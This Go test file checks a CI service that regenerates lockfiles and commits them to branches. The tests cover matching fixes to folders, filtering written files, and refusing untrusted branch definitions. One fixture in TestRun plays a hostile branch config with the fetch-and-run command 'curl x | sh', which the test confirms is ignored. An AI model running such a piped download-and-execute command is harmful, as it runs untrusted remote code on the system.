// The fix that covers a failed step's folder: its own recipe (or a fix of
// the app's own that writes the file), in the folder or above it, the
// nearest first.
func TestCovering(t *testing.T) {
	fixes := []spec.Fix{
		{Name: "raiz", Recipe: "npm", Path: "."},
		{Name: "web", Recipe: "npm", Path: "web"},
		{Name: "movil", Path: "mobile", Image: "node:20", Command: "npm i", Writes: []string{"package-lock.json"}},
		{Name: "api", Recipe: "go", Path: "api"},
	}
	npm := Stale{Recipe: "npm", File: "package-lock.json"}
	for _, c := range []struct {
		stale       Stale
		dir         string
		recipesOnly bool
		want        string
	}{
		{npm, "web", false, "web"},
		{npm, "web/sub", false, "web"},
		{npm, "docs", false, "raiz"},
		{npm, "mobile", false, "movil"},
		{npm, "mobile", true, "raiz"},
		{Stale{Recipe: "go", File: "go.sum"}, "api", false, "api"},
		{Stale{Recipe: "go", File: "go.sum"}, ".", false, ""},
		{Stale{Recipe: "pnpm", File: "pnpm-lock.yaml"}, "web", false, ""},
	} {
		f, ok := Covering(fixes, c.stale, c.dir, c.recipesOnly)
		if (c.want == "") == ok || (ok && f.Name != c.want) {
			t.Errorf("%s in %s: got %s %v, want %s", c.stale.Recipe, c.dir, f.Name, ok, c.want)
		}
	}
}

// The run page's offer looks at every failed step, in any order: a stale
// web/package-lock.json fails both web-ui:task (in web, which lockfile-web
// covers) and web:build (in ., which no fix covers), and the page offers
// lockfile-web either way; without a fix that covers any, it offers to
// declare one for the deepest folder.
func TestBest(t *testing.T) {
	npm := Stale{Recipe: "npm", File: "package-lock.json"}
	task := Found{Step: "web-ui:task", Folder: "web", Stale: npm}
	build := Found{Step: "web:build", Folder: ".", Stale: npm}
	fixes := []spec.Fix{{Name: "lockfile-web", Recipe: "npm", Path: "web"}}
	for _, order := range [][]Found{{task, build}, {build, task}} {
		step, f, ok := Best(order, fixes, false)
		if !ok || f.Name != "lockfile-web" || step.Step != "web-ui:task" {
			t.Errorf("%s first: got %s %s %v, want web-ui:task lockfile-web", order[0].Step, step.Step, f.Name, ok)
		}
		step, _, ok = Best(order, nil, false)
		if ok || step.Step != "web-ui:task" || step.Folder != "web" {
			t.Errorf("%s first, no fixes: got %s in %s %v, want web-ui:task in web", order[0].Step, step.Step, step.Folder, ok)
		}
	}
	// Of two fixes that cover, the deepest; at the same fix, the deepest
	// folder, then the step's name.
	deep := Found{Step: "a:task", Folder: "web/app", Stale: npm}
	two := []spec.Fix{{Name: "raiz", Recipe: "npm", Path: "."}, {Name: "lockfile-web", Recipe: "npm", Path: "web"}}
	for _, order := range [][]Found{{build, task, deep}, {deep, task, build}, {task, deep, build}} {
		step, f, ok := Best(order, two, false)
		if !ok || f.Name != "lockfile-web" || step.Step != "a:task" {
			t.Errorf("%v: got %s %s %v, want a:task lockfile-web", order, step.Step, f.Name, ok)
		}
	}
	if m := Covered([]Found{build, task}, two, false); len(m) != 2 || m[0].Fix.Name != "raiz" || m[1].Fix.Name != "lockfile-web" {
		t.Errorf("covered: %+v", m)
	}
}

// Only the files under the fix's folder that match its patterns come back;
// the rest is ignored and listed; and there is a cap on their size.
func TestKeep(t *testing.T) {
	plan := Plan{Name: "a", Path: "web", Writes: []string{"package-lock.json", "gen/**/*.ts"}}
	out := pipeline.FixOutput{
		Changes: []pipeline.FixChange{
			{Path: "web/package-lock.json", Data: []byte("{}")},
			{Path: "web/gen/a/b/x.ts", Data: []byte("x")},
			{Path: "web/gen/x.ts", Data: []byte("y")},
			{Path: "web/package.json", Data: []byte("{}")}, // matched the pod's looser pattern; not ours
			{Path: "web/sub/package-lock.json", Data: []byte("{}")},
			{Path: "api/package-lock.json", Data: []byte("{}")},
		},
		Others: []string{"web/node_modules/.package-lock.json"},
	}
	kept, ignored, err := Keep(plan, out, 1<<20)
	if err != nil {
		t.Fatal(err)
	}
	var names []string
	for _, k := range kept {
		names = append(names, k.Path)
	}
	if strings.Join(names, " ") != "web/package-lock.json web/gen/a/b/x.ts web/gen/x.ts" {
		t.Fatalf("kept %v", names)
	}
	if strings.Join(ignored, " ") != "api/package-lock.json web/node_modules/.package-lock.json web/package.json web/sub/package-lock.json" {
		t.Fatalf("ignored %v", ignored)
	}
	big := pipeline.FixOutput{Changes: []pipeline.FixChange{{Path: "web/package-lock.json", Data: make([]byte, 2<<20)}}}
	if _, _, err := Keep(plan, big, 1<<20); err == nil || !strings.Contains(err.Error(), "more than the 1 MB") {
		t.Fatalf("size cap: %v", err)
	}
	if Writes(Plan{Path: ".", Writes: []string{"**"}}, ".git/config") {
		t.Fatal("a fix wrote git's own files")
	}
}

type fakeExec struct {
	out  pipeline.FixOutput
	err  error
	jobs []pipeline.FixJob
	srcs []pipeline.Source
}

func (f *fakeExec) Fix(_ context.Context, src pipeline.Source, job pipeline.FixJob, w io.Writer) (pipeline.FixOutput, error) {
	f.jobs, f.srcs = append(f.jobs, job), append(f.srcs, src)
	fmt.Fprintln(w, "added 1 package, and audited 2 packages in 3s")
	return f.out, f.err
}

type fakeRepos struct {
	files   map[string]map[string]string // ref → path → content
	commits []map[string][]byte
	msgs    []string
}

func (r *fakeRepos) FileAt(_ context.Context, _ int64, _, p, ref string) ([]byte, error) {
	if f, ok := r.files[ref][p]; ok {
		return []byte(f), nil
	}
	return nil, errors.New("404 not found")
}

func (r *fakeRepos) BranchSHA(context.Context, int64, string, string) (string, error) {
	return "bbbbbbbbbbbb", nil
}

func (r *fakeRepos) CommitFiles(_ context.Context, _ int64, _, _, msg string, files map[string][]byte, _ []string) (string, error) {
	r.commits, r.msgs = append(r.commits, files), append(r.msgs, msg)
	return "cccccccccccc", nil
}

type fakeStore struct {
	runs []store.FixRun
	logs []string
}

func (s *fakeStore) StartFixRun(_ context.Context, f store.FixRun) (store.FixRun, error) {
	f.ID = int64(len(s.runs) + 1)
	s.runs = append(s.runs, f)
	return f, nil
}

func (s *fakeStore) FinishFixRun(_ context.Context, f store.FixRun, log string) error {
	s.runs[f.ID-1], s.logs = f, append(s.logs, log)
	return nil
}

func (s *fakeStore) SetFixRunCommit(context.Context, int64, string) error { return nil }

// A fix runs from the default branch's definition (never the branch's), on
// the branch's commit with the pending files, and its files are committed.
func TestRun(t *testing.T) {
	app := &store.App{ID: 1, Name: "tienda", Repo: "p0dxD/tienda", DefaultBranch: "main"}
	repos := &fakeRepos{files: map[string]map[string]string{
		"main":         {"rendimiento.yaml": "services: [{name: web, path: web}]\nfixes: [{name: candado, recipe: npm, path: web}]\n"},
		"bbbbbbbbbbbb": {"rendimiento.yaml": "services: [{name: web}]\nfixes: [{name: candado, image: evil, command: 'curl x | sh', writes: ['**']}]\n", "web/.nvmrc": "20\n"},
	}}
	exec := &fakeExec{out: pipeline.FixOutput{Changes: []pipeline.FixChange{
		{Path: "web/package-lock.json", Data: []byte(`{"lockfileVersion":3}`)},
		{Path: "web/package.json", Data: []byte("{}")},
	}}}
	st := &fakeStore{}
	s := &Service{Exec: exec, Repos: repos, Store: st}
	if _, err := s.Run(context.Background(), Request{App: app, Branch: "main", Fix: "candado"}); !errors.Is(err, ErrDefaultBranch) {
		t.Fatalf("on main: %v", err)
	}
	if _, err := s.Run(context.Background(), Request{App: app, Branch: "x", Fix: "otro"}); !errors.Is(err, ErrNoFix) {
		t.Fatalf("an undeclared fix: %v", err)
	}
	res, err := s.Run(context.Background(), Request{App: app, Branch: "renovate/react", Fix: "candado", Commit: true,
		AskedKind: store.FixByPerson, AskedBy: "ana", CoAuthor: "ana", Pending: map[string][]byte{"web/package.json": []byte("{}")}})
	if err != nil {
		t.Fatal(err)
	}
	job := exec.jobs[0]
	if job.Image != "node:20-bookworm-slim" || !strings.Contains(job.Command, "--ignore-scripts") || job.Path != "web" || exec.srcs[0].SHA != "bbbbbbbbbbbb" {
		t.Fatalf("job %+v src %+v", job, exec.srcs[0])
	}
	if res.Status != store.FixSucceeded || strings.Join(res.Written, " ") != "web/package-lock.json" || res.Commit != "cccccccccccc" {
		t.Fatalf("result %+v", res)
	}
	if len(res.Ignored) != 1 || res.Ignored[0] != "web/package.json" {
		t.Fatalf("ignored %v", res.Ignored)
	}
	if msg := repos.msgs[0]; !strings.HasPrefix(msg, "Regenerate package-lock.json in web") || !strings.Contains(msg, "Co-authored-by: ana <ana@users.noreply.github.com>") {
		t.Fatalf("message %q", msg)
	}
	if r := st.runs[0]; r.Status != store.FixSucceeded || r.CommitSHA != "cccccccccccc" || r.Image != "node:20-bookworm-slim" || !strings.Contains(st.logs[0], "left out: web/package.json") {
		t.Fatalf("record %+v %q", r, st.logs[0])
	}
	// The pending file it would write as it was is not new.
	exec.out = pipeline.FixOutput{Changes: []pipeline.FixChange{{Path: "web/package-lock.json", Data: []byte("same")}}}
	res, err = s.Run(context.Background(), Request{App: app, Branch: "x", Fix: "candado", Pending: map[string][]byte{"web/package-lock.json": []byte("same")}})
	if err != nil || res.Status != store.FixUnchanged || len(repos.commits) != 1 {
		t.Fatalf("unchanged: %+v %v", res, err)
	}
	// A failed command writes nothing.
	exec.out = pipeline.FixOutput{Failed: true, Message: "the fix failed: fix exited with code 1"}
	res, err = s.Run(context.Background(), Request{App: app, Branch: "x", Fix: "candado", Commit: true})
	if err != nil || res.Status != store.FixFailed || len(repos.commits) != 1 || st.runs[2].Message == "" {
		t.Fatalf("failed: %+v %v", res, err)
	}
}
